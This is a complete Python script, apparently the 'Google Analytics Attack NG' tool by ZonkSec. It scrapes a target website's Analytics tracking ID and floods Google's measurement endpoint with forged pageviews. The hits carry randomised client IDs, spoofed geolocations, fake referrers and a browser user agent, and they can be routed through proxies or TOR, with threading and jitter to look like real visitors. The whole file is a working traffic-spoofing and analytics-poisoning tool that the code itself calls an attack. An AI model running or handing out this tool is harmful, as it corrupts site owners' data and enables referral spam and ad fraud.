import sys
import os
import requests #pip install requests[socks] to get socks for TOR
import re
import time
import random
import google
import logging
from Queue import Queue
from threading import Thread
import argparse
from urlparse import urlparse

#https://developers.google.com/analytics/devguides/collection/protocol/v1/
#https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid

def main():
    ascii_art()
    global proxies
    global ignore_certs
    ignore_certs = False
    proxies = {
        # 'http': 'socks5://192.168.0.103:9100',
        # 'https': 'socks5://192.168.0.103:9100'
        #'http': 'http://192.168.0.107:8080',
        #'https': 'https://192.168.0.107:8080'
    }

    parser = argparse.ArgumentParser()
    parser.add_argument('-m','--mode',choices=['referral', 'google_keyword_referral','direct','organic'],help='required.',required=True)
    parser.add_argument('-v', '--verbose', help="increase output verbosity",action="store_true")
    parser.add_argument('--target_url',nargs='+', help='one or more URLs to target', metavar='')
    parser.add_argument('--referral_url',nargs='+', help='one or more URLs to refer traffic from',metavar='')
    parser.add_argument('-n','--number_of_sessions', help='required. total number of sessions to be emulated',metavar='',type=int)
    parser.add_argument('--threads', help='number of threads, aka concurrent sessions', default=1, type=int, metavar='')
    parser.add_argument('--auto_target_pool', help='automatically get target_urls from google, based on host derived from target_url', default=0, type=int, metavar='')
    parser.add_argument('--auto_target_keyword', help='keyword to get target_urls from google', metavar='')
    parser.add_argument('--referral_keyword', metavar='',help='keyword to retrieve referral URLs from Google')
    parser.add_argument('--referral_pool', metavar='', help='determines # of referral URLs to retrieve from Google based on referral_keyword',type=int,default=20)
    parser.add_argument('--geo_list', help='list of origin geo locations. \'criteriaID\' or \'criteriaIDs-criteriaIDs\'',metavar='',nargs='+')
    parser.add_argument('--thread_delay', help='delay between users/threads', default=0, type=int, metavar='')
    parser.add_argument('--thread_jitter', help='amount of randomness in thread_delay', default=0, type=jitter_type, metavar='')
    parser.add_argument('--bounces', help='number of bounces between target pages',type=int,metavar='',default=0)
    parser.add_argument('--bounce_urls', help='specific URLs to bounce too. If not set, it will be auto-populated via Google Search',nargs='+',metavar='')
    parser.add_argument('--bounce_length_jitter',metavar='',help='amount of randomness in # of bounces',type=jitter_type,default=0)
    parser.add_argument('--bounce_pool',metavar='',help='determines # of URLs to retrieve from Google, if not providing bounce_urls',type=int,default=20)
    parser.add_argument('--bounce_delay',metavar='',help='amount of seconds between bounces in a session',type=int,default=0)
    parser.add_argument('--bounce_jitter',metavar='',help='amount of randomness in bounce_delay',type=jitter_type,default=0)
    parser.add_argument('--end_with',action="store_true",help='end with a bounce to target page')
    parser.add_argument('--proxy', help='use a HTTP or SOCKS proxy to make requests. note: google searches not included', metavar='')
    parser.add_argument('--ignore_certs', help='ignore ssl certs when making requests. note: google searches not included',action="store_true")
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
        logging.getLogger("requests").setLevel(logging.WARNING)

    if args.proxy:
        if re.search("(socks5:\/\/.*:.)", args.proxy):
            logging.info("[+] Using a SOCK5 proxy: " + args.proxy)
            proxies['http'] = args.proxy
            proxies['https'] = args.proxy
        elif re.search("(http:\/\/.*:.)", args.proxy):
            logging.info("[+] Using a HTTP proxy: " + args.proxy)
            proxies['http'] = args.proxy
            proxies['https'] = args.proxy
        elif re.search("(https:\/\/.*:.)", args.proxy):
            logging.info("[+] Using a HTTPS proxy: " + args.proxy)
            proxies['http'] = args.proxy
            proxies['https'] = args.proxy
        else:
            logging.error('[-] Not a valid proxy definition.')
            sys.exit(1)

    if args.geo_list:
        args.geo_list=build_geo_list(args.geo_list)
    else:
        logging.info('[*] geo_list not provided. requests will randomize from US cities.')
        args.geo_list = build_geo_list(['1012873-1028514'])

    ignore_certs = args.ignore_certs


    #gets params and builds session for each mode, then runs threads
    if args.mode == 'referral':
        if not args.target_url or not args.referral_url or not args.number_of_sessions:
            logging.error('[-] target_url,referral_url, and number_of_sessions are required for referral attack')
            sys.exit(1)
        session = session_builder(target_url=args.target_url,mode=args.mode,auto_target_pool=args.auto_target_pool,auto_target_keyword=args.auto_target_keyword, referral_url=args.referral_url, bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_length_jitter, session_jitter=args.bounce_jitter, session_delay=args.bounce_delay, end_with=args.end_with, bounce_pool=args.bounce_pool, geo_list=args.geo_list)
        thread_master(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads, user_delay=args.thread_delay, user_jitter=args.thread_jitter)
    elif args.mode == 'google_keyword_referral':
        if not args.target_url or not args.referral_keyword or not args.referral_pool or not args.number_of_sessions:
            logging.error('[-] target_url,referral_keyword, referral_pool, and number_of_sessions are required for google keyword')
            sys.exit(1)
        logging.info('[*] Referral URLs are needed.')
        referral_urls = []
        search_results = list(google.search(query=args.referral_keyword, num=args.referral_pool, stop=1))
        logging.info('[+] Grabbed %s referral URLs using Google', str(sum(1 for i in search_results)))
        for result in search_results:
            referral_urls.append(str(result))
        session = session_builder(target_url=args.target_url,mode=args.mode, referral_url=referral_urls,auto_target_pool=args.auto_target_pool,auto_target_keyword=args.auto_target_keyword, bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_length_jitter, session_jitter=args.bounce_jitter, session_delay=args.bounce_delay, end_with=args.end_with, bounce_pool=args.bounce_pool, geo_list=args.geo_list)
        thread_master(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads, user_delay=args.thread_delay, user_jitter=args.thread_jitter)
    elif args.mode == 'direct':
        if not args.target_url or not args.number_of_sessions:
            logging.error('[-] target_url and number_of_sessions are required for direct')
            sys.exit(1)
        session = session_builder(target_url=args.target_url, mode=args.mode, referral_url=[''],bounce_urls=args.bounce_urls,auto_target_pool=args.auto_target_pool,auto_target_keyword=args.auto_target_keyword, bounces=args.bounces, bounce_jitter=args.bounce_length_jitter,session_jitter=args.bounce_jitter, session_delay=args.bounce_delay,end_with=args.end_with, bounce_pool=args.bounce_pool, geo_list=args.geo_list)
        thread_master(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads,user_delay=args.thread_delay, user_jitter=args.thread_jitter)
    elif args.mode == 'organic':
        if not args.target_url or not args.number_of_sessions:
            logging.error('[-] target_url and number_of_sessions are required for organic')
            sys.exit(1)
        session = session_builder(target_url=args.target_url, mode=args.mode, referral_url=['https://www.google.com'],auto_target_pool=args.auto_target_pool,auto_target_keyword=args.auto_target_keyword, bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_length_jitter,session_jitter=args.bounce_jitter, session_delay=args.bounce_delay,end_with=args.end_with, bounce_pool=args.bounce_pool, geo_list=args.geo_list)
        thread_master(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads,user_delay=args.thread_delay, user_jitter=args.thread_jitter)

def build_geo_list(geo_list):
    list = []
    for item in geo_list:
        if '-' in item:
            min = int(item.split('-')[0])
            max = int(item.split('-')[1])
            list.extend(range(min,max))
        else:
            list.append(int(item))
    return list

def url_validator(url):
    result = urlparse(url)
    if result.scheme != '' and result.netloc != '':
        return True
    else:
        return False

def jitter_type(x):
    x = float(x)
    if not x <= 1 or not x >=0:
        raise argparse.ArgumentTypeError("jitter must be between 0 and 1.")
    return x



def thread_master(session, number_of_sessions, threads=1, user_delay=5, user_jitter=.50):
    session_queue = Queue()
    logging.info('[*] Queueing %s sessions.', str(number_of_sessions))
    for _ in range(number_of_sessions):
        session_queue.put("")
    logging.info('[*] Starting %s threads.', str(threads))
    for i in range(threads):
        worker = Thread(target=thread_worker, args=(i, session_queue, session, user_delay, user_jitter))
        worker.setDaemon(True)
        worker.start()
    logging.info('[*] Waiting for threads.')
    session_queue.join()
    logging.info('[+] Attack Complete.')

def thread_worker(i, q, session, delay=5, jitter=.50):
    while True:
        q.get()
        cid = session.random_unique_cid()
        geo_id = session.random_geo_id()
        logging.debug('[+] T' + str(i) + ': Starting a session. CID: ' + str(cid))
        behavior = session.run(client_id=cid,geo_id=geo_id)
        logging.info('[+] T' + str(i) + ': Session complete. CID: '+str(cid)+'. GEO_ID: '+str(geo_id)+' Behavior: '+behavior)
        time_delay = delay - random.randint(0, int(delay * jitter))
        logging.info('[*] T' + str(i) + ': Sleeping for '+str(time_delay))
        time.sleep(time_delay)
        q.task_done()

class session_builder:
    def __init__(self, target_url, referral_url,mode='referral', auto_target_pool=0,auto_target_keyword='',bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, end_with=False, tracking_id=None, geo_id='',bounce_jitter=.50,geo_list=None):
        self.target_url = target_url
        self.referral_url = referral_url
        self.mode = mode
        self.page_delay = session_delay
        self.page_delay_jitter = session_jitter
        self.geo_id = geo_id
        self.bounces = bounces
        self.bounce_urls = bounce_urls
        self.end_with = end_with
        self.used_cids = []
        self.client_id = self.random_unique_cid()
        self.tracking_id = tracking_id
        self.bounce_pool = bounce_pool
        self.bounce_jitter = bounce_jitter
        self.geo_list = geo_list
        self.auto_target_pool = auto_target_pool
        self.auto_target_keyword = auto_target_keyword

        #end_with logic
        if self.bounces == 0:
            self.end_with = False

        #get site url
        o = urlparse(self.target_url[0])
        self.target_site = o.scheme + '://'+ o.netloc

        #verify all urls from target list are same domain
        o = urlparse(self.target_url[0])
        match = o.netloc
        for target in target_url:
            o = urlparse(target)
            if not o.netloc == match:
                logging.error('[-] not all target_urls are from same site')
                sys.exit(1)

        #grabs tracking ID from target site.
        if self.tracking_id is None:
            logging.info('[*] trackingID not provided. attempting to automatically collect')
            if url_validator(self.target_site):
                page = requests.get(self.target_site,proxies=proxies,verify=(not ignore_certs))
            else:
                logging.error('[-] cannot get trackingID. not a valid target site')
                sys.exit(1)
            try:
                m = re.search("'(UA-(.*))',", page.text)
                self.tracking_id = str(m.group(1))
                logging.info('[+] trackingID found: ' + self.tracking_id)
            except:
                logging.error('[-] trackingID not found. target may not be running analytics')
                sys.exit(1)

        #if bounce urls are need, collects them.
        if self.bounces != 0 and self.bounce_urls is None:
            logging.info('[*] Bounce URLs are needed.')
            self.bounce_urls = []
            search_results = list(google.search(query="site:"+self.target_site, num=self.bounce_pool,stop=1))
            logging.info('[+] Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.bounce_urls.append(str(result))
        elif self.bounces != 0 or self.bounce_urls != None:
            # verify all urls from bounce_urls are same domain if manually set
            o = urlparse(self.target_url[0])
            match = o.netloc
            for target in self.bounce_urls:
                o = urlparse(target)
                if not o.netloc == match:
                    logging.error('[-] not all bounce_urls are from same target site')
                    sys.exit(1)

        #if auto target urls are need, grabs them
        if self.auto_target_pool > 0:
            logging.info('[*] Target URLs are needed.')
            self.target_url = []
            if self.auto_target_keyword == None or self.auto_target_keyword == '':
                search_results = list(google.search(query="site:"+self.target_site, num=self.auto_target_pool,stop=1))
            else:
                search_results = list(google.search(query="site:" + self.target_site + ' ' + self.auto_target_keyword, num=self.auto_target_pool, stop=1))
            logging.info('[+] Grabbed %s target URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.target_url.append(str(result))

        #display urls for debug
        logging.debug('[+] Referral URLs: ' + str(self.referral_url))
        logging.debug('[+] Target URLs: ' + str(self.target_url))
        logging.debug('[+] Bounce URLs: ' + str(self.bounce_urls))


    def random_unique_cid(self):
        unique = False
        while not unique:
            cid = random.randint(10000, 99999)
            if cid in self.used_cids:
                unique = False
            else:
                unique = True
                self.used_cids.append(cid)
                self.client_id = cid
        return cid

    def random_geo_id(self):
        return self.geo_list[random.randint(0,len(self.geo_list)-1)]


    def run(self,client_id=None,geo_id=None):
        if client_id is None or geo_id is None:
            logging.error('[-] Missing client_id or geo_id')
            sys.exit(1)
        pages = []
        delays = []

        selected_target = self.target_url[random.randint(0,len(self.target_url)-1)]
        selected_referral = self.referral_url[random.randint(0,len(self.referral_url)-1)]
        last_page = selected_referral
        pages.append(last_page)
        target_request = analytics_request(document_location=selected_target,document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
        target_request.send()
        pages.append('[T] '+selected_target)
        bounce_count = 0
        last_page = selected_target
        bounce_end = self.bounces - random.randint(0,int(self.bounces * self.bounce_jitter))
        while (bounce_count < bounce_end):
            delay = self.page_delay - random.randint(0,int(self.page_delay * self.page_delay_jitter))
            logging.debug('[*] Session sleep for %i seconds.', delay)
            delays.append(str(delay))
            time.sleep(delay)
            bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls)-1)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
            bounce_request.send()
            pages.append(bounce_request.document_location)
            last_page = bounce_request.document_location
            bounce_count += 1

        if self.end_with:
            delay = self.page_delay - random.randint(0, int(self.page_delay * self.page_delay_jitter))
            logging.debug('[*] Session sleep for %i seconds.', delay)
            delays.append(str(delay))
            time.sleep(delay)
            target_request = analytics_request(document_location=selected_target, document_referrer=last_page, client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
            target_request.send()
            pages.append('[T] '+selected_target)

        behavior = ''
        count = 0
        for page in pages:
            if count > 0 and count <= len(delays):
                if delays[count-1] == '0':
                    behavior = behavior + page + ' => '
                else:
                    behavior = behavior + page + ' ('+ delays[count-1] + ' sec delay) => '
            else:
                behavior = behavior + page + ' => '
            count += 1

        return behavior[:-4]


def ascii_art():
    print("""
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     Google Analytics Attack NG                         
            by ZonkSec                                  
__   __   __   __   __   __   .-. __   __ .-. __   __   
                             (o o)       (o o)          
                            \| O \/     \| O \/         
                              \   \       \   \         
                               `~~~'       `~~~'        
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Website:  https://zonksec.com
Twitter:  @zonksec
""")

class analytics_request:
    def __init__(self,document_referrer,document_location,client_id,tracking_id=None,version=1,hit_type='pageview',user_agent ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',geo_id ='US', anon_ip =1):
        self.version = version
        self.tracking_id = tracking_id
        self.client_id = client_id
        self.hit_type = hit_type
        self.user_agent = user_agent
        self.geo_id = geo_id
        self.document_referrer = document_referrer
        self.document_location = document_location
        self.anon_ip = anon_ip

        if self.tracking_id is None:
            logging.error('[-] trackingID not set.')
            sys.exit(1)

    def send(self):
        params = {}
        params['v'] = self.version
        params['tid'] = self.tracking_id
        params['cid'] = self.client_id
        params['t'] = self.hit_type
        params['aip'] = self.anon_ip
        if url_validator(self.document_location):
            params['dl'] = self.document_location
        else:
            logging.error('[-] document_location is not a valid url')
            os._exit(1)
        if not self.document_referrer == '':
            if url_validator(self.document_referrer):
                params['dr'] = self.document_referrer
            else:
                logging.error('[-] document_referrer is not a valid url')
                os._exit(1)
        params['geoid'] = self.geo_id
        params['ua'] = self.user_agent

        r = requests.post('https://www.google-analytics.com/collect', data=params,proxies=proxies,verify=(not ignore_certs))
        logging.debug('[*] Request Sent. ' + str(params))


main()